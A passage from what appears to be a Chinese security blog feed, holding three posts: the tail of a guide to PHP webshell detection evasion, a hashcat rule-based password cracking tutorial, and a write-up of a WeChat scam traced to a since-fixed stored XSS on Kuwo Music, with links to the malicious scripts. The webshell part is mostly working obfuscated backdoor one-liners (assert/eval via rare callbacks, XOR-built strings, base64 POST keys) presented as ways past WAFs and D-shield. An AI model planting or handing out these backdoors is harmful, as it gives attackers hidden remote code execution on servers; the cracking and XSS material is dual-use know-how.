class="token function">substr_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"assexx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"rt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$arrayName</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span> <span class="token operator">=></span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利⽤回调函数免杀"><a href="#利⽤回调函数免杀" class="headerlink" title="利⽤回调函数免杀"></a>利⽤回调函数免杀</h3><p>常⽤的php回调函数有：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">registregister_shutdown_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">register_tick_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">filter_var_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">uasort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">uksort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">array_reduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">array_walk_recursive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意常⽤的回调函数⼤部分都已经加⼊了免杀套餐，所以我们需要尽可能的去寻找⽐较⽣僻的回调函数。</p></blockquote><p>例如：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">array_intersect_ukey</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"x"</span><span class="token punctuation">]</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"assert"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2018%2022%2011%20%7Bsecond.png" alt="202003182211{second"></p><h3 id="回调函数配合⽅法或类"><a href="#回调函数配合⽅法或类" class="headerlink" title="回调函数配合⽅法或类"></a>回调函数配合⽅法或类</h3><p>例如回调函数配合⽅法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">array_intersect_ukey</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"assert"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"x"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使⽤特殊字符"><a href="#使⽤特殊字符" class="headerlink" title="使⽤特殊字符"></a>使⽤特殊字符</h3><p>特殊字符有：<code>\n</code>,<code>\r</code>,<code>\t</code>等。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token function">substr_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"assexx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"rt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token variable">$d</span><span class="token punctuation">(</span><span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">.=</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经测试特殊字符的免杀性不强，勉强可以使⽤。</p><h3 id="利⽤POST包获取关键字"><a href="#利⽤POST包获取关键字" class="headerlink" title="利⽤POST包获取关键字"></a>利⽤POST包获取关键字</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$decrpt</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$decrps</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'y'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$arrs</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span> <span class="token variable">$decrpt</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$arrs</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$arrs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arrt</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span> <span class="token variable">$decrps</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$arrt</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$arrt</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$arrs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$arrt</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2018%2022%2013%20%7Bsecond.png" alt="202003182213{second"></p><p>也可以使⽤⾃定义的加密⽅式，post包传⼊参数再由webshell解密，此种⽅式现有的waf查杀能⼒基本为0.</p><h3 id="⽆字符特征⻢"><a href="#⽆字符特征⻢" class="headerlink" title="⽆字符特征⻢"></a>⽆字符特征⻢</h3><p>利⽤异或或者编码等⽅式构造⽆字符的webshell，例如：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%01'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%13'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%13'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%05'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%12'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%14'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $_='assert';</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0D'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%2F'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0E'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%09'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $_='_POST';</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$$__</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// assert($_POST[_]);</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><p>github上有个项⽬可以使⽤python⽣成异或免杀的webshell，不过其特征已被捕获，现在已经⽆法过D盾了。<a href="https://github.com/yzddmr6/webshell-venom">github地址</a><br>不过可以使⽤下⾯这篇⽂章的思路来进⾏修改重新免杀：<a href="https://www.anquanke.com/post/id/193042">随机异或⽆限免杀D盾之再免杀</a></p><p>举个例⼦：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">v01cano</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">,</span><span class="token variable">$sss</span><span class="token punctuation">,</span> <span class="token variable">$bbb</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ccc</span><span class="token operator">=</span><span class="token variable">$bbb</span><span class="token punctuation">;</span><span class="token function">array_intersect_ukey</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">,</span> <span class="token variable">$sss</span><span class="token punctuation">,</span> <span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_0</span><span class="token operator">=</span><span class="token string single-quoted-string">'&amp;'</span><span class="token operator">^</span><span class="token string double-quoted-string">"\x47"</span><span class="token punctuation">;</span><span class="token variable">$_1</span><span class="token operator">=</span><span class="token string single-quoted-string">'C'</span><span class="token operator">^</span><span class="token string double-quoted-string">"\x30"</span><span class="token punctuation">;</span><span class="token variable">$_2</span><span class="token operator">=</span><span class="token string single-quoted-string">'A'</span><span class="token operator">^</span><span class="token string double-quoted-string">"\x32"</span><span class="token punctuation">;</span><span class="token variable">$_3</span><span class="token operator">=</span><span class="token string single-quoted-string">'v'</span><span class="token operator">^</span><span class="token string double-quoted-string">"\x13"</span><span class="token punctuation">;</span><span class="token variable">$_4</span><span class="token operator">=</span><span class="token string single-quoted-string">'J'</span><span class="token operator">^</span><span class="token string double-quoted-string">"\x38"</span><span class="token punctuation">;</span><span class="token variable">$_5</span><span class="token operator">=</span><span class="token string single-quoted-string">'f'</span><span class="token operator">^</span><span class="token string double-quoted-string">"\x12"</span><span class="token punctuation">;</span><span class="token variable">$ddd</span><span class="token operator">=</span><span class="token variable">$_0</span><span class="token operator">.</span><span class="token variable">$_1</span><span class="token operator">.</span><span class="token variable">$_2</span><span class="token operator">.</span><span class="token variable">$_3</span><span class="token operator">.</span><span class="token variable">$_4</span><span class="token operator">.</span><span class="token variable">$_5</span><span class="token punctuation">;</span> <span class="token function">v01cano</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$ddd</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// $_ = 1</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token operator">^</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $_= _</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token operator">^</span><span class="token string double-quoted-string">"~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// _P</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">^</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// _PO</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token operator">^</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// _POS</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&#123;"</span><span class="token operator">^</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// _POST</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span>$ <span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mima:0</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PHP7-1之后免杀困境"><a href="#PHP7-1之后免杀困境" class="headerlink" title="PHP7.1之后免杀困境"></a>PHP7.1之后免杀困境</h2><p>php7.1之后我们已经不能使⽤强⼤的<code>assert</code>函数了,waf只要把函数封死就可以有效的阻⽌webshell免杀,⽽<code>eval</code>并没有<code>assert</code>那么灵活。后期⼤家可能更加倾向使⽤⼤⻢。</p><h2 id="参考⽂章"><a href="#参考⽂章" class="headerlink" title="参考⽂章"></a>参考⽂章</h2><ul><li><a href="https://www.addon.pub/2018/06/11/Webshell%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%85%8D%E6%9D%80/">Webshell⼯作原理与免杀学习</a></li><li><a href="https://xz.aliyun.com/t/5152">对于php免杀webshell的⼀些总结</a></li><li><a href="https://www.anquanke.com/post/id/193042">随机异或⽆限免杀D盾之再免杀</a></li><li><a href="https://blog.csdn.net/Alexz__/article/details/102488644">基于php⼀句话⽊⻢的变种总结</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> bypass方法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hashcat rule的使用</title>
      <link href="2019/12/26/hashcat-rule/"/>
      <url>2019/12/26/hashcat-rule/</url>
      
        <content type="html"><![CDATA[<h2 id="hashcat简介"><a href="#hashcat简介" class="headerlink" title="hashcat简介"></a>hashcat简介</h2><p>hahcat自称是世界上密码破解最快的工具，hashcat支持多种密码散列算法，可以使用CPU或者GPU进行破解且破解规则灵活。关于hashcat破解密码的使用可以参考：<a href="https://xz.aliyun.com/t/4008#toc-28">Hashcat的使用手册总结</a></p><h2 id="hashcat-rule"><a href="#hashcat-rule" class="headerlink" title="hashcat  rule"></a>hashcat  rule</h2><p>hashcat除了进行hash破解外还支持基于规则生成密码字典，或者直接基于规则去破解hash。</p><p>hashcat的规则位于<code>/usr/share/hashcat/rules</code>目录下，默认存在的规则如下：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">.├── best64.rule├── combinator.rule├── d3ad0ne.rule├── dive.rule├── generated2.rule├── generated.rule├── hybrid│   ├── append_d.rule│   ├── append_ds.rule│   ├── append_du.rule│   ├── append_dus.rule│   ├── append_hl.rule│   ├── append_hu.rule│   ├── append_ld.rule│   ├── append_lds.rule│   ├── append_ldu.rule│   ├── append_ldus.rule│   ├── append_l.rule│   ├── append_ls.rule│   ├── append_lu.rule│   ├── append_lus.rule│   ├── append_s.rule│   ├── append_u.rule│   ├── append_us.rule│   ├── prepend_d.rule│   ├── prepend_ds.rule│   ├── prepend_du.rule│   ├── prepend_dus.rule│   ├── prepend_hl.rule│   ├── prepend_hu.rule│   ├── prepend_ld.rule│   ├── prepend_lds.rule│   ├── prepend_ldu.rule│   ├── prepend_ldus.rule│   ├── prepend_l.rule│   ├── prepend_ls.rule│   ├── prepend_lu.rule│   ├── prepend_lus.rule│   ├── prepend_s.rule│   ├── prepend_u.rule│   └── prepend_us.rule├── Incisive-leetspeak.rule├── InsidePro-HashManager.rule├── InsidePro-PasswordsPro.rule├── leetspeak.rule├── oscommerce.rule├── rockyou-30000.rule├── specific.rule├── T0XlC-insert_00-99_1950-2050_toprules_0_F.rule├── T0XlC-insert_space_and_special_0_F.rule├── T0XlC-insert_top_100_passwords_1_G.rule├── T0XlC.rule├── T0XlCv1.rule├── toggles1.rule├── toggles2.rule├── toggles3.rule├── toggles4.rule├── toggles5.rule└── unix-ninja-leetspeak.rule<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不同的规则可以生成不同的密码字典，我们可也可以自定义规则文件。规则说明可以参考：<a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">Rule-based Attack</a></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基于规则生成字典"><a href="#基于规则生成字典" class="headerlink" title="基于规则生成字典"></a>基于规则生成字典</h3><p>建立一个基本字典文件，只包含abc和password两个密码，使用规则生成新的字典：<br><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-26-14-10-15" alt="2019-12-26-14-10-15"></p><p>例如使用best64规则生成一个新的字典文件：</p>  <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">hashcat --stdout base.txt -r &#x2F;usr&#x2F;share&#x2F;hashcat&#x2F;rules&#x2F;best64.rule -o password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-26-14-41-30" alt="2019-12-26-14-41-30"></p><p>这样就生层完毕了，生成了154个密码。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-26-14-42-49" alt="2019-12-26-14-42-49"></p><h3 id="基于规则进行hash爆破"><a href="#基于规则进行hash爆破" class="headerlink" title="基于规则进行hash爆破"></a>基于规则进行hash爆破</h3><p>密码破解过程中，如果源字典比较大，使用密码规则生成新字典保存在硬盘上的方式就不太明智了，更常用的方式是直接在命令中指定规则使用。</p><p>shadow.txt包含一个测试账号Hash。密码文件包含abc和password两个密码，hash类型为md5，使用密码字典+规则破解的命令如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-26-15-53-46" alt="2019-12-26-15-53-46"></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">hashcat -a 0 -m 0 shadow.txt .&#x2F;base.txt -r &#x2F;usr&#x2F;share&#x2F;hashcat&#x2F;rules&#x2F;best64.rule<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-26-15-55-27" alt="2019-12-26-15-55-27"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>有一篇文章很有意思是关于常见rule的对比：<a href="https://www.notsosecure.com/one-rule-to-rule-them-all/">One Rule to Rule Them Al</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hashcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从微信群不良广告到酷我音乐存储型XSS再到乐视url跳转</title>
      <link href="2019/12/23/kuwomusic-xss/"/>
      <url>2019/12/23/kuwomusic-xss/</url>
      
        <content type="html"><![CDATA[<blockquote><p>以下文章中提到的所有漏洞都已经报相关厂商并已修复</p></blockquote><h2 id="事件起因"><a href="#事件起因" class="headerlink" title="事件起因"></a>事件起因</h2><p>在一个满是<del>黑客</del>（安全从业者）的群里，竟然混入了一个不明飞行物，他还发了个极具诱惑的广告：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-23-23-1-8" alt="2019-12-23-23-1-8"></p><p>我仔细一看（马赛克后面的文字请自行瞎想），感觉事情不对，点开其中的广告仔细欣赏了一番，于是有了下面的故事。</p><h2 id="微信不背这个锅"><a href="#微信不背这个锅" class="headerlink" title="微信不背这个锅"></a>微信不背这个锅</h2><p>一般来说在微信中打开未经备案的域名或者微信监测到的恶意域名都会提示风险并阻断访问：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-24-11-12-7" alt="2019-12-24-11-12-7"></p><p>但是骗子在群里发送的链接却没有提示，直接跳转到了下面这个页面：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-24-11-13-38" alt="2019-12-24-11-13-38"></p><p>海底捞满脸问号，我做错了什么？</p><p>瞧这优美的设计，骗子的美术功底还不错。点击抢，就会跳转到另外一个页面，提示你已经抢到了多少红包，分享朋友圈和群即可领取。这个页面我没截到，大概就是我上面描述的东西。</p><p>大概的代码如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-24-11-34-12" alt="2019-12-24-11-34-12"></p><p>然后就需要你去联系客服人员，然后有人就上当了。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-24-11-50-39" alt="2019-12-24-11-50-39"></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>打开骗子发的链接后发现有一个跳转过程：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-24-12-40-29" alt="2019-12-24-12-40-29"></p><p>跳转的那个页面如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-24-12-42-50" alt="2019-12-24-12-42-50"></p><p>酷我音乐留言板，我怀疑这个页面存在xss，被人插入了恶意的js代码导致了页面跳转到骗子给定的页面，也就是上面看到的抽奖页。</p><p>我仔细看了下页面的请求信息：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-24-12-42-10" alt="2019-12-24-12-42-10"></p><p>找出了二个可疑的加载js代码的url地址：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">http:&#x2F;&#x2F;cdn.zhudazhanzuidiao.com&#x2F;222.jpghttp:&#x2F;&#x2F;mbawind.oss-cn-beijing.aliyuncs.com&#x2F;2wap&#x2F;2mei&#x2F;s.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中222.jpg文件也是一个js文件</p><p>s.js文件是最主要的js文件，就是用来展示那个抽奖页面的。s.js中还加载了几个js文件。</p><p>有兴趣的同学可以深入分析下这几个文件</p><table><thead><tr><th>文件</th><th>MD5</th></tr></thead><tbody><tr><td><a href="https://xbsfcursotamandareg12br-my.sharepoint.com/:i:/g/personal/darkless_mail_hrka_net/EeccVFHMDiZEhh7rA4NJCJIBPoEwXChDKQsUTuDVUsrrXw?e=LpUa4L">222.jpg</a></td><td>610d141a3b1e827dbd29fa2a1fff6565</td></tr><tr><td><a href="https://xbsfcursotamandareg12br-my.sharepoint.com/:u:/g/personal/darkless_mail_hrka_net/EZUsI7ORw11KsfTu35ACLXcB8h1aFMNNe12_kub7b99X3Q?e=O0ixvS">s.js</a></td><td>99dd595529146aef041fe2906bbb776d</td></tr><tr><td><a href="https://xbsfcursotamandareg12br-my.sharepoint.com/:u:/g/personal/darkless_mail_hrka_net/ERVWC4OVMrVIjZ_tM0yQf1QBlVpthiOFVzw7Gqnj8ZdtcA?e=vHOC74">t.js</a></td><td>1ad50dcd3b631ad0cf2a252bbda6ba2b</td></tr></tbody></table><h2 id="酷我音乐主站XSS"><a href="#酷我音乐主站XSS" class="headerlink" title="酷我音乐主站XSS"></a>酷我音乐主站XSS</h2><p>尝试寻找酷我音乐存在xss的留言板地址。</p><p>最终发现的地址如下：</p><p><a href="http://www.kuwo.cn/huodong/st/ActCommentsNewFromDB?subid=6&dis=/szyy/testt/comments.jsp&pn=0#29">http://www.kuwo.cn/huodong/st/ActCommentsNewFromDB?subid=6&amp;dis=/szyy/testt/comments.jsp&amp;pn=0#29</a></p><p><code>subid</code>的值可以遍历，不同的值代表一个留言页面。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-24-13-42-23" alt="2019-12-24-13-42-23"></p><p>很多页面都已被垃圾留言充斥。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-24-14-45-36" alt="2019-12-24-14-45-36"></p><p>subid=6的页面已被黑产利用来进行诈骗钓鱼等非法活动</p><p>每个页面下面都有个留言框可以留言：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-24-13-44-9" alt="2019-12-24-13-44-9"></p><p>这里没有登录按钮，可以在<a href="www.kuwo.cn">酷我音乐</a>登陆后把cookie带过来，即可留言。</p><p>尝试写入一个xss payload，弹窗成功，说明这个页面确实存在xss。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-24-14-2-47" alt="2019-12-24-14-2-47"></p><p>提交厂商进行修复：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-24-14-34-6" alt="2019-12-24-14-34-6"></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>给微信举报后，已将原来那个链接封禁了，今天打开一看又可以访问了。仔细一看原来是借助乐视的url跳转漏洞复活了。黑产大哥，我服了you，可否把你的零day送我几个呢。</p><p>这个洞还没修，图片就不放了。</p>]]></content>
      
      
      <categories>
          
